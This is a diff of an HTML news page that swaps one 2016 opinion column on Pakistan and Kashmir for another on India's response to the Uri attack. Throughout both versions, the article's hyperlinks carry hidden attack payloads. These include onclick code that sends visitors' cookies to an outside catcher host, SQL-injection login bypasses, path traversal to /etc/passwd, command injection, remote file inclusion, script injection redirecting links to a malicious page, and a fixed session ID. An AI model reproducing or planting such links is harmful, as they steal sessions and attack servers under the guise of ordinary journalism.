@@ -15,38 +15,94 @@
 
 
 <div class="single">
-<h2>A Campaign Of Terror: The Pakistanis may never have Kashmir, but their violence has transformed it</h2>
+<h2> 'Exasperated' Indians want visible and punitive action against Pakistan</h2>
 
-<p class="details">September 20, 2016, 2:00 am IST C Christine Fair  <a href="#"></a> </p>
-<h2 align="right"><a href="20160919-opinion.php"> Previous </a> </h2>
+<p class="details">By Kanchan Gupta : 21 September 2016<a href="#"></a> </p>
+<h2 align="right"><a href="20160920-opinion.php"> Previous </a> </h2>
 
 <p>
-Feigning outrage at the killing of Pakistan-backed Hizbul Mujahideen commander <a href="http://bit.ly/2cKc7xM" target="_blank">Burhan Wani,</a> Pakistan’s civilian-led government decried his killing by Indian security forces as “deplorable and condemnable”. This group is considered to be a <a href="http://www.theplanetreports.com/uploads/" target="_blank">terrorist organisation</a> by the United States, the European Union, and India alike. This conniption once again exposed Pakistan’s <a href="http://www.theplanetreports.com/images/" target="_blank">unstinting support</a> for the zoo of Islamist terrorists that it uses to achieve its foreign policy objectives in India, Afghanistan and elsewhere.
+The <a href="http://bit.ly/2cKc7xM" target="_blank">rush of reaction </a> within India to the terrorist attack - clearly plotted and executed by Pakistan - on an <a href="http://www.theplanetreports.com/uploads/" target="_blank">Army base at Uri in Kashmir</a>, which resulted in the death of 18 soldiers, is quite unlike the outrage that has followed similar acts of cross-border aggression in the <a href="http://www.theplanetreports.com/images/" target="_blank">past.</a>
 </p> <p>
-The timing of this charade is not coincidental: it is contemporaneous with mounting criticisms over Pakistani human rights abuses in Balochistan as it tries to crush any and all opposition to the infamous <a href="http://www.theplanetreports.com/uploads/phpinfo.php" target="_blank">“China Pakistan Economic Corridor”.</a>  Pakistan explicitly counters criticism over its activities in Balochistan with reference to Indian security force’s killings in Kashmir. This is yet another Pakistani false equivalence.
+This time, the sense of India's exasperation is  <a href="http://www.theplanetreports.com/uploads/phpinfo.php" target="_blank">palpable.</a>
 </p> <p>
-It must be said bluntly that in Kashmir, Pakistan has no legal equities. Neither the Indian Independence Act of 1947 nor the Radcliffe Boundary Commission accord Pakistan any right to Kashmir. As is well-known, the Maharaja of <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">Kashmir Hari Singh </a> only acceded to India after Pakistan dispatched irregular forces to seize the terrain by force.
+Irrespective of their personal political preferences, Indians across the country want to see Prime Minister Narendra Modi take visible, punitive action <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">against Pakistan.</a>
 </p> <p>
-As the work of Shuja Nawaz – the brother of a deceased army chief – makes clear, these were not non-state actors. In its effort to seize Kashmir through warfare in 1947-48, 1965 and 1999 and by supporting a menagerie of terrorists since 1947 and an intense proxy war since 1989, Pakistan has demonstrated that it actually has little regard for the <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%271&submit=Login" target="_blank">Kashmiris themselves.</a>
+<b>
+Assurance</b>
 </p> <p>
-As the Pakistanis sought to exploit the indigenous uprising that began in 1989, it raised and dispatched Deobandi and Salafist terrorist organisations such as <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">Jaish-e-Muhammed</a> and Lashkar-e-Taiba respectively, precisely because they have no regard for <a href="http://theplanetreports.com/traversal.php?data=cat%20../../../../../../etc/passwd" target="_blank">Kashmiri culture </a> and beliefs. Whereas their Kashmiri proxies were more reticent to kill civilians and attack sufi shrines, these terrorists have shown no compunction.
+Modi’s assurance that, “those behind this despicable attack will not go <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%271&submit=Login" target="_blank">unpunished”,</a> has not served to assuage feelings or stop them from boiling over. 
 </p> <p>
-They also sustained a reign of terror against women who do not veil as they demand by throwing acid on their faces and other crimes. The consequences of this are visible to any <a href="http://theplanetreports.com/traversal.php?data=cat%20../../../../../../etc/passwd" target="_blank">long-time observer.</a> When I first visited the Valley in 1991, I never saw a woman in a black burqa with niqab. Instead women wore a scarf tied behind their necks. Now the black burqa, niqab and even socks and gloves are ubiquitous even beyond the cities and towns. The Pakistanis may never have Kashmir, but their violence has transformed it.
+Some of the harshest criticism of Modi’s meandering Pakistan policy has emanated from his staunchest supporters.
 </p> <p>
-Turning to the most recent events, it is well-known that the recent episode of stone pelting has Pakistani backing. The stone pelting has had the intended consequences of <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank">goading Kashmir’s </a> poorly equipped and poorly trained police into killing civilians who are protesting. About 80 people have been killed in this recent campaign of Pakistan-sponsored uprising and state response.
+A cartoon by the popular newspaper cartoonist Manjul, who is known to weigh-in after considerable rumination, shows Modi blowing smoke rings at Pakistan through the barrel of a <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">field gun.</a>
 </p> <p>
-To be clear, it is extremely unfortunate that these deaths have occurred. And indeed, the Indian government needs to find other ways of managing crowds than looking for the chimerical <a href="http://www.theplanetreports.com/index.php?name=Shekhar%3Cscript%3Ewindow.onload%20=%20function(){var%20link=document.getElementsByTagName(%22a%22);link%20%20[0].href=%22http://theplanetreports.com/malicious.php%22;}%3C/script%3E" target="_blank">non-lethal weapons.</a> If Kashmir’s police had proper riot gear and personal protective equipment, the urge to fire at stone pelters would likely diminish. This would benefit India as it would deprive Pakistan of the result it so craves. But this incident reveals more than anything that Pakistan is willing to orchestrate the deaths of Kashmiris for its own political aims.
+Others have been less charitable in <a href="http://theplanetreports.com/traversal.php?data=cat%20../../../../../../etc/passwd" target="_blank">lampooning Modi the Strong Man with a 56-inch chest.</a>
 </p> <p>
-The vacuity of the so-called concern about Kashmir is reinforced by the complete omission of any mention of the Kashmiri Pandits who were ethnically cleansed by Pakistan-backed terrorists in 1990. Why does the <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank">“Kashmir problem”</a> only centre on Muslims in the Valley and not any of the other lawful residents of the state?
+There has been a spate of social media posts highlighting the similarities between what Modi and his predecessor Manmohan Singh had to say after cross-border terrorist attacks <a href="http://theplanetreports.com/traversal.php?data=cat%20../../../../../../etc/passwd" target="_blank">emanating from Pakistan.</a>
 </p> <p>
-Finally, the Pakistani civilian and military leadership continue to renew their demands that all <a href="http://www.theplanetreports.com/traversal.php?data=ls -la" target="_blank">UN Security Council resolutions</a> on Kashmir be fulfilled. Maleeha Lodhi, Pakistan’s permanent representative to the UN, continues to opine that “non-implementation of UN Security Council resolutions pertaining to the <a href="http://www.theplanetreports.com/redirect.php?url=http://www.theplanetreports.com/hack.php">Kashmir issue</a> is a travesty of law”. She, like other Pakistanis making these insensate claims, are banking on the fact that most people have never read the hallowed resolutions.
+Modi has promised to  <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank">‘punish’ the perpetrators;</a> where as Singh once promised to ‘go after’ them.
 </p> <p>
-I have and the language is clear. Pakistan was to first withdraw all <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank">non-Kashmiri persons</a> from the area, including regular and irregular security forces. Then and only then, India was to demilitarise as well. However, India was allowed to retain enough forces to protect against further <a href="http://www.theplanetreports.com/buy.php?item=Monthly&PHPSESSID=jeoefgfi6b16h7l213jh30k2q1+&quantity=400" target="_blank">Pakistani incursions.</a> Once both of these sequential steps were taken to the satisfaction of a UN appointed body, then the arrangements for a plebiscite were to take place. Pakistanis yammering about the <a href="http://www.theplanetreports.com/comments.php?sig=<script>alert('No+more+entries+Possible+')%3B<%2Fscript>" target="_blank">non-implementation</a> of this accord have only themselves to blame.
+The findings of the annual political survey conducted by the American organisation, PEW, whose publication coincided with the attack at Uri, shows there is more to the outrage than mere passing reaction to an incident, that these are not enraged sentiments that will <a href="http://www.theplanetreports.com/index.php?name=Shekhar%3Cscript%3Ewindow.onload%20=%20function(){var%20link=document.getElementsByTagName(%22a%22);link%20%20[0].href=%22http://theplanetreports.com/malicious.php%22;}%3C/script%3E" target="_blank">fail the test of time.</a>
 </p> <p>
-Turning to the issue of <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">Balochistan</a> on the one hand and the recent events in Kashmir on the other: both campaigns of violence are manifestations of Pakistani policy. The Pakistan army, along with the Frontier Corps and its various intelligence agencies are waging an all-out war against the <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">Baloch</a> to clear the province for Chinese economic exploitation. There are no estimates of the casualties or of the persons who have disappeared. There is no accounting for the whereabouts of these myriad <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%271&submit=Login" target="_blank">disappeared persons.</a>
+Modi’s popularity ratings remain phenomenally sky-high more than two years into his five-year term.
 </p> <p>
-By law, the US is required to impose Leahy Amendment sanctions on any military unit engaging in human rights violations. The Pakistan military is waging this war with the subsidy of the US, which so far has shown nothing but pusillanimity in contending with Pakistan even though Pakistan is the root cause of American failures in Afghanistan.
-</p>
+There is sufficient endorsement of his economic policies to persist with them with suitable mid-course corrections.
+</p> <p>
+At the moment, there is no challenger to the <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank">‘masnad’ of Delhi.</a>
+</p> <p>
+The finding that stands out in stark contrast to the others and bruises the Prime Minister’s image, especially within his core constituency, is the extremely low support for Modi’s approach in dealing with Pakistan.
+</p> <p>
+The PEW poll was conducted long before Pakistan’s <a href="http://www.theplanetreports.com/traversal.php?data=ls -la" target="_blank">latest transgression.</a>
+</p> <p>
+An instant poll today would yield near zero support and possibly lower overall <a href="http://www.theplanetreports.com/redirect.php?url=http://www.theplanetreports.com/hack.php">endorsement of Modi.</a>
+</p> <p>
+During the 2014 election campaign, Modi was scathing and unsparing in his criticism of Singh’s abysmal failure to deal with Pakistan.
+</p> <p>
+After winning a spectacular mandate, Modi, through explicit deed if not spoken word, has controverted everything he said, and stood for on Pakistan, while seeking votes.
+</p> <p>
+This by itself is not unknown of. Indian politicians tend to blow hot on Pakistan when not in power. The <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank">heat dissipates</a> once in office.
+</p> <p>
+Barring Indira Gandhi, every Indian Prime Minister has chased the elusive legacy of being remembered by <a href="http://www.theplanetreports.com/buy.php?item=Monthly&PHPSESSID=jeoefgfi6b16h7l213jh30k2q1+&quantity=400" target="_blank">posterity as a peacemaker.</a>
+</p> <p>
+Pakistan’s military dictators and Prime Ministers, on the other hand, have resolutely followed the doctrine of inflicting a thousand cuts on India by waging a covert war of cross-border terrorism.
+</p> <p>
+The twain of good intention and ignoble evil were never destined to meet. But what was a brilliant opening gambit, of inviting Pakistan’s Prime Minister Nawaz Sharif along with other SAARC heads of government to his swearing-in ceremony, has turned into disastrous adventurism in a terrain known to be treacherous and hostile. 
+</p> <p>
+Modi should have known better, never mind pressure from Washington, DC, or the urge to go down in history as the <a href="http://www.theplanetreports.com/comments.php?sig=<script>alert('No+more+entries+Possible+')%3B<%2Fscript>" target="_blank">statesman who achieved the impossible.</a>
+</p> <p><b>
+Exchange</b>
+</p> <p>
+It’s not possible to turn the clock back. The exchange of saris and shawls, the long walk with Sharif in Kathmandu, the orchestrated ‘surprise’ visit to Sharif’s home on his birthday, the invitation to a Pakistani team, including an ISI man, to visit Pathankot after the IAF base there was attacked, the resumption of talks, all that and more now belong to the past.
+</p> <p>
+Modi has to begin afresh and craft an all-new policy to deal with India’s constant tormentor.
+</p> <p>
+If he indeed means to keep his promise, he must act craftily and ruthlessly, regardless of consequences by way of upsetting the US and China.
+</p> <p>
+
+Even if India must stand alone, he should let it be known, <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">India will stand.</a>
+</p> <p><b>
+Damage
+</b></p> <p>
+It would be stupid to expect Modi to publicly state what he plans to do. That’s not how sensible leaders respond to challenges to national security.
+</p> <p>
+Between war (undesirable) and inaction (unacceptable) lies a vast space for coercive action, both overt and covert, to inflict material damage and <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">disorient Pakistan.</a> 
+</p> <p>
+Giving asylum to Baloch nationalists and asserting India’s rights over Pakistan-occupied Kashmir and Gilgit Baltistan are good first steps; they send a message to Pakistan and its patrons.
+</p> <p>
+Modi should also declare he won’t attend the SAARC summit at Islamabad and withdraw MFN status to Pakistan.
+</p> <p>
+It would distress Pakistan and its funders if Modi were to downgrade <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%271&submit=Login" target="_blank">diplomatic relations.</a>
+</p> <p>
+These are some of the things that can and should be done immediately. They would calm down Indians and give Modi time to figure out the big response, its elements, and their implementation.
+</p> <p>
+Anything less would only breed sullen, unforgiving anger.
+</p> <p>
+Voters, contrary to what politicians love to believe, have a long memory. Meanwhile, Modi would do well to go easy on tall talk of exposing and isolating Pakistan by taking India’s plaint to international fora.
+</p> <p>
+Pakistan does not care about being exposed and the countries that matter will not isolate Pakistan.
+</p> <p>
+Soothing stories by establishment journalists about India’s grand diplomatic success will not quite make up for the fact that insincere statements of condemnation of Pakistani terrorism by foreign governments are meaningless triumphs, poppycock victories.
+
 
 
 
